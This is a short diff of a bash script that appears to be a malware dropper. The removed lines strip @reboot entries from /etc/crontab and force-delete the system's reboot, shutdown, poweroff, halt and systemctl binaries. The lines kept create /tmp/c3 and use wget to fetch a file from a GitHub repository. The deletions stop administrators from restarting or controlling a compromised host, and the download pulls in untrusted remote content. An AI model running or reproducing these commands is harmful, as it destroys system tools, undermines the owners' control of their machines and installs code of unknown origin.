@@ -1,6 +1,4 @@
 #!/bin/bash
-sudo sed -i '/^@reboot/d' /etc/crontab
-sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 mkdir -p /tmp/c3
 cd /tmp/c3
 wget https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/9v.json
